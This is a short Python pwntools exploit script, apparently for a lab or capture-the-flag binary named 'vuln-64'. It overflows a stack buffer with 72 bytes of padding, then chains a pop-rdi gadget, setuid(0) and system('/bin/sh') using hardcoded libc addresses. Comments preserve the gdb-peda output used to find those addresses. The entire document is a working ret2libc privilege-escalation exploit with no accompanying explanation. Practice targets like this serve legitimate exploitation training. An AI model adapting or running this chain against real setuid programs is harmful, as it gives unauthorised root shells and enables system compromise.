#!/usr/bin/env python3

from pwn import *

offset=72
p = process('./vuln-64')

#gdb-peda$ p system
#$1 = {<text variable, no debug info>} 0xf7c4c800 <system>
#gdb-peda$ p setuid
#$2 = {<text variable, no debug info>} 0xf7ce0690 <setuid>

#gdb-peda$ p system
#$1 = {int (const char *)} 0x7ffff7e0e330 <__libc_system>
#gdb-peda$ p setuid
#$2 = {int (uid_t)} 0x7ffff7e97420 <__setuid>
#gdb-peda$ find /bin/sh
#Searching for '/bin/sh' in: None ranges
#Found 1 results, display max 1 items:
#libc.so.6 : 0x7ffff7f58031 --> 0x68732f6e69622f ('/bin/sh')

# setuid
system =  0x7ffff7e0e330
setuid =  0x7ffff7e97420
binsh  =  0x7ffff7f58031
poprdi = 0x00007ffff7df4089
ret    = 0x0000000000401016

payload = b'A' * offset

payload += p64(poprdi)
payload += p64(0x0)
payload += p64(setuid)
payload += p64(ret)
payload += p64(poprdi)
payload += p64(binsh)
payload += p64(ret)
payload += p64(system)

print (p.recvuntil("Overflow me\n"))
p.sendline(payload)
p.interactive()
